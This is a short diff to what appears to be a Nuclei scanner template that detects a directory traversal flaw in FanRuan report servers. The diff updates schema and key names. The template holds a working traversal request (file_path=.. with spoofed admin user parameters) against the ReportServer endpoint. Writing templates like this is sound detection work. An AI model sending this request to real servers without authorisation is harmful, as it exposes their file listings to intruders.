@@ -1,10 +1,11 @@
+# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
 id: frServer-listDir
 info:
   name: 帆软目录遍历漏洞
   author: Str1am
   severity: high
   tags: frServer,listDir
-requests:
+http:
   - method: GET
     path:
       - "{{BaseURL}}/WebReport/ReportServer?op=fs_remote_design&cmd=design_list_file&file_path=..&currentUserName=admin&currentUserId=1&isWebReport=true"
